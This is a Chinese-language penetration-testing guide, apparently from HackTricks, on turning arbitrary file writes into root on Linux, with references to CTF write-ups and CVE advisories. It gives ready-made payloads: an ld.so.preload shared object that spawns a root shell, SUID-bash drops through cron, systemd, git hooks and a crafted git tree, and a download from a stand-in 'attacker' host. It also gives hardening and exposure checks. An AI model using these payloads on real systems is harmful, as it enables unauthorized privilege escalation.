# 向 Root 任意写入文件

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` 是一个系统范围的 shared objects 列表，dynamic linker 会在其他 shared objects 之前加载它们。Secure-execution mode 会对 preloading 应用额外限制，因此 `/tmp/pe.so` 这样的 library path 并不是通用的 SUID-binary 技巧。\
如果你可以创建或修改该文件，加载它的进程就会在加载其他 shared objects 之前加载其中列出的 library，从而允许在该进程的上下文中执行代码。<sup>[[12]](#references)</sup>

例如：`echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** 是针对 repository 中事件运行的可执行脚本，包括 commit 和 merge 操作。如果由**特权脚本或用户**执行这些操作，且攻击者可以**写入 `.git` 文件夹**，则可以利用该 hook 进行**privilege escalation**。<sup>[[13]](#references)</sup>

例如，可以在 git repo 的 **`.git/hooks`** 中**生成一个脚本**，使其在创建新 commit 时始终执行：
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Privileged Git tree export path traversal

特权 synchronizer 可能不会执行 checkout，而是使用 `git ls-tree` 枚举受攻击者影响的 repository，使用 `git cat-file` 读取每个 blob，将报告的 pathname 与 staging directory 拼接，然后自行写入。当它将 `-c safe.directory=*`（禁用 Git 针对不同所有者 repository 的保护）与缺少目标 containment check 结合使用时，就会以 synchronizer 的权限实现**任意文件写入**。绝对 tree-entry name 会使 Python 的 `os.path.join(stage, name)` 丢弃 `stage`；包含 `../` 的 relative name 则会在 filesystem 解析时逃逸。由于 application materializes raw tree，而不是要求 Git 执行 checkout，checkout 时对 pathname 的拒绝不会保护该 sink。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

在 root services、timers、deployment agents、template importers 以及 backup/restore jobs 中查找这种代码结构：<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
树条目编码为 `<mode> SP <name> NUL <raw object ID>`。`git hash-object --literally` 选项有意允许创建正常解析或 `git fsck` 可能拒绝的对象数据，因此可以在一次性 clone 中构造一个文件名为绝对目标路径的 tree。此示例创建一个 cron 文件 blob，将构造的 tree 封装在 commit 中，并将一个 branch 移动到该 commit；但要成功利用，仍需要具备更新特权任务所使用的 repository 的权限，并且 Git server 必须接受格式错误的对象。<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
加固必须同时覆盖 repository ingestion 和最终的 filesystem 操作：<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- 将 `safe.directory=*` 替换为 service 必须信任的确切 repositories，并在可行时以非 root 权限运行 repository processing。
- 在 materialization 前拒绝 absolute names 以及包含任何 `.` 或 `..` 的 component。拼接后进行 canonicalize，并验证 destination 仍位于预期 root 目录下。
- 避免 check-then-open symlink race：相对于受信任的 directory descriptor 打开文件；在 Linux 上，对于 attacker-controlled paths，使用带有 `RESOLVE_BENEATH` 和 `RESOLVE_NO_SYMLINKS` 的 `openat2()`。
- 优先在 isolated directory 中执行正常 checkout，而不是根据 plumbing output 重新实现 checkout。如果必须进行 raw-object ingestion，请启用 receive-side validation，例如 `receive.fsckObjects=true`；不要降低为拒绝 crafted trees 所需的、与 pathname 相关的 `receive.fsck.*` 检查结果。

### Cron 与 Time 文件

如果你可以**写入由 root 执行的 cron-related files**，通常就能在该 job 下次运行时获得 code execution。值得关注的 targets 包括：<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` 或 `/var/spool/cron/crontabs/` 中 root 自身的 crontab
- `systemd` timers 及其触发的 services

快速检查：
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
常见滥用途径：

- **向** `/etc/crontab` **或** `/etc/cron.d/` **中的文件追加新的 root cron job**
- **替换** `run-parts` **已执行的脚本**
- **通过修改其启动的脚本或 binary，为现有 timer target 植入 backdoor**

最小 cron payload 示例：
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
如果你只能写入 `run-parts` 使用的 cron 目录，则改为在其中放置一个可执行文件：
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
注意：

- `run-parts` 通常会忽略包含点号的文件名，因此建议使用 `backup` 而不是 `backup.sh`。<sup>[[15]](#references)</sup>
- 某些系统使用 `systemd` timers 代替经典 cron，但滥用思路相同：**修改 root 稍后将执行的内容**。<sup>[[20]](#references)</sup>

### Service 与 Socket 文件

如果你可以写入 **`systemd` unit files** 或其引用的文件，则可能通过重新加载并重启该 unit，或等待 service/socket activation 路径触发，以 root 身份实现代码执行。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

有趣的目标包括：

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 中的 Drop-in overrides
- `ExecStart=`、`ExecStartPre=`、`ExecStartPost=` 引用的 Service scripts/binaries
- root service 加载的可写 `EnvironmentFile=` 路径

快速检查：
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
常见的滥用路径：

- 在你可以修改的、由 root 拥有的 service unit 中 **Overwrite `ExecStart=`**
- 添加包含恶意 `ExecStart=` 的 **drop-in override**，并先清除旧的配置
- 对 unit 已引用的 script/binary **植入后门**
- 通过修改相应的 `.service` 文件 **Hijack a socket-activated service**，该服务会在 socket 收到连接时启动

恶意 override 示例：
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的激活流程：
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
如果你无法自行重启 services，但可以编辑由 socket 激活的 unit，那么你可能只需**等待客户端连接**，即可触发以 root 身份执行被植入后门的 service。<sup>[[17]](#references)</sup>

### 覆盖特权 PHP sandbox 使用的受限 `php.ini`

某些自定义 daemons 会通过使用**受限的 `php.ini`**（例如 `disable_functions=exec,system,...`）运行 `php`，来验证用户提供的 PHP。如果 sandbox 中的代码仍具有**任何写入原语**（例如 `file_put_contents`），并且你可以访问 daemon 使用的**确切 `php.ini` 路径**，就可以**覆盖该配置**以解除限制，然后提交第二个 payload，使其以提升后的权限运行。<sup>[[2]](#references)</sup>

典型流程：

1. 第一个 payload 覆盖 sandbox 配置。
2. 第二个 payload 在危险函数重新启用后执行代码。

最小示例（替换为 daemon 使用的路径）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
如果 daemon 以 root 身份运行（或使用 root 所有的路径进行验证），第二次执行将获得 root 上下文。当受 sandbox 限制的 runtime 仍然可以写入文件时，这本质上就是通过覆盖配置实现的 **privilege escalation**。

### binfmt_misc

`binfmt_misc` 会在 `/proc/sys/fs/binfmt_misc` 下公开注册项；每个注册项都会将一种文件类型模式与一个 interpreter 关联起来。其权限影响取决于谁可以更改该注册项，以及之后由哪个进程执行匹配的文件，因此在将其视为 privilege-escalation 路径之前，应先确认这些要求。<sup>[[21]](#references)</sup>

### 覆盖 schema handlers（如 http: 或 https:）

Desktop environments 使用 MIME associations 和 desktop entries 来选择 URI schemes 的应用程序；如果攻击者可以写入相关的 per-user configuration 和 desktop-entry directories，就可以将这些 schemes 重定向到其控制的 launcher。通过修改 `$HOME/.config/mimeapps.list` 文件，将 HTTP 和 HTTPS URL handlers 指向恶意文件（例如 `x-scheme-handler/http=evil.desktop` 和 `x-scheme-handler/https=evil.desktop`），用户的一次点击即可调用该 desktop entry。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root 执行用户可写的 scripts/binaries

如果某个 privileged workflow 运行类似 `/bin/sh /home/username/.../script` 的内容（或运行位于 unprivileged user 所有目录中的任意 binary），你就可以劫持它：<sup>[[1]](#references)</sup>

- **检测执行：** 使用 pspy 监控进程，以捕获 root 调用用户可控路径的情况。<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **确认可写性：**确保目标文件及其目录均由你的用户拥有/可写。
- **劫持目标：**备份原始 binary/script，并放置一个创建 SUID shell（或执行其他 root 操作）的 payload，然后恢复权限：
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **触发 privileged action**（例如按下会生成 helper 的 UI button）。当 root 重新执行被劫持的路径时，使用 `./rootshell -p` 获取提权后的 shell。

### 仅修改 page cache 中 privileged binary 的文件

某些 kernel bug 不会修改**磁盘上的文件**。相反，它们只允许你修改可读文件的 **page cache 副本**。如果你可以针对一个 **setuid** 或其他由 **root 执行**的 binary，那么下一次执行可能会运行内存中由 attacker 控制的字节，即使磁盘上的文件 hash 未发生变化，也能实现提权。<sup>[[3]](#references)[[4]](#references)</sup>

可以将其理解为一种**仅运行时存在的文件写入 primitive**：<sup>[[3]](#references)</sup>

- **磁盘保持干净**：inode 和磁盘上的字节不会改变
- **内存处于 dirty 状态**：读取或执行缓存 page 的进程会获取 attacker 修改后的内容
- **效果是临时的**：重启或 cache eviction 后修改会消失

这种 primitive 介于经典的 **arbitrary file write** 和 Dirty COW / Dirty Pipe 等较早的 **page-cache abuse** bug 之间：<sup>[[3]](#references)</sup>

- Dirty COW 依赖 race
- Dirty Pipe 存在写入位置限制
- 如果 vulnerable path 能够直接写入 cached file-backed page，那么 page-cache-only primitive 可能更加可靠

#### Generic privesc flow

1. 获取能够写入 **file-backed page cache page** 的 kernel primitive
2. 将其用于一个**可读的 privileged binary** 或其他由 root 执行的文件
3. 在 page 被从 cache 中 eviction **之前**触发执行
4. 在磁盘文件看起来仍未修改的情况下，以 root 身份获得 code execution

典型的高价值目标：

- **setuid-root** binary
- 由 **root service** 启动的 helper
- 通常从共享 host kernel/page cache 的 **container** 中执行的 binary

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) 是此类问题的一个很好例子。vulnerable path 位于 Linux crypto userspace API（`AF_ALG` / `algif_aead`）中：<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` 可以将可读文件中的 page-cache page 引用移动到 crypto TX scatterlist 中
- in-place `algif_aead` decrypt path 复用了 source 和 destination buffer
- `authencesn` 随后写入 destination tag region
- 当该 region 仍引用 spliced file-backed page 时，写入就会落入目标文件的 **page cache**

因此，有价值的 technique 不是 CVE 本身，而是以下 pattern：

- 将 file-backed cache page **送入 kernel subsystem**
- 让 subsystem **将其视为可写输出**
- 在内存中触发一次受控的小范围覆盖

公开的 PoC 使用重复的 **4-byte write** 修改内存中的 `/usr/bin/su`，然后执行它。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) 展示了同一种 **page-cache-only write-to-root** pattern 的另一种变体，但这次 sink 是 **IPsec ESP decrypt**，而不是 `AF_ALG`。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

这里重要的 technique 是 **metadata-laundering step**：

- `splice()` 将一个**只读的 file-backed page-cache page** 放入 ESP-in-UDP packet
- 原始的 DirtyFrag mitigation 为该 skb 添加 `SKBFL_SHARED_FRAG` 标记，使 `esp_input()` 在 decrypt 前**执行 copy**
- netfilter `TEE` 通过 `nf_dup_ipv4()` -> `__pskb_copy_fclone()` 复制 packet
- clone 保留**相同的 physical page-cache reference**，但丢失 `SKBFL_SHARED_FRAG`
- `esp_input()` 随后将该 clone 视为安全对象，并对 file-backed page 执行 in-place `cbc(aes)` decrypt

因此，给 reviewer 的启示比这个 CVE 更广泛：如果某个 mitigation 依赖 **skb/page metadata** 来决定操作是否必须先执行 copy，那么任何**保留 backing page 但丢弃 metadata 的 clone/copy path**，都可能悄然重新开放该 write primitive。

典型 exploitation flow：

1. 使用 `unshare(CLONE_NEWUSER | CLONE_NEWNET)`，在 private network namespace 内获得 **`CAP_NET_ADMIN`**
2. 启用 loopback，并在 `mangle/OUTPUT` 中安装 **netfilter `TEE` rule**
3. 通过 `NETLINK_XFRM` 安装 **XFRM ESP transport SA**
4. 将每个目标 4-byte word 编码到 SA 的 `seq_hi` field 中（DirtyFrag 的 word-selection trick）
5. 发送 spliced ESP-in-UDP packet，使 **TEE clone** 到达 `esp_input()` 并执行 in-place decrypt
6. 重复操作，直到 `/usr/bin/su` 或其他 privileged executable 的 page-cache 副本中包含由 attacker 控制的 code

从实际效果来看，这与 `AF_ALG` example 相同：磁盘上的文件保持干净，但 `execve()` 会使用**已被修改的 page-cache bytes**，从而获得 root。<sup>[[8]](#references)[[9]](#references)</sup>

此变体的实用 exposure 检查：
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
短期内，攻击面缩减在这里同样是特定于路径的：升级到包含 `48f6a5356a33` 的 kernel 可以修复 clone path，而阻止 `xt_TEE` autoload 可以移除 **flag-laundering step**，阻止 `esp4` / `esp6` 则可以移除 **decrypt sink**。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 暴露与排查

如果你怀疑存在此类 bug，不要只依赖磁盘完整性检查。还应验证：
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
以下配置值区分了可加载接口与内置于 kernel 中的接口；crypto build rules 将 `CONFIG_CRYPTO_USER_API_AEAD` 映射到 `algif_aead`。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`：`algif_aead` 可以作为 module 加载或卸载
- `CONFIG_CRYPTO_USER_API_AEAD=y`：该接口内置于 kernel 中
- setuid binaries 是很好的目标，因为仅通过 page-cache-only patch 就可能将 local foothold 转变为 root

#### `algif_aead` path 的 attack-surface reduction

如果 vulnerable interface 由可加载 module 提供：<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
如果它被编译进内核，一些披露指出会阻塞 init 路径：<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
这种 mitigation 也值得在其他 kernel LPE 中记住：如果 exploitation 依赖某个特定的 optional interface，那么禁用或将该 interface 列入 blacklist，即使尚无法进行完整的 kernel upgrade，也能在 exploitation path 的最早阶段将其阻断。<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – 劫持由 root 执行的、位于用户可写 PaperCut 目录中的脚本](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall 关于 CVE-2026-31431 的 oss-security disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
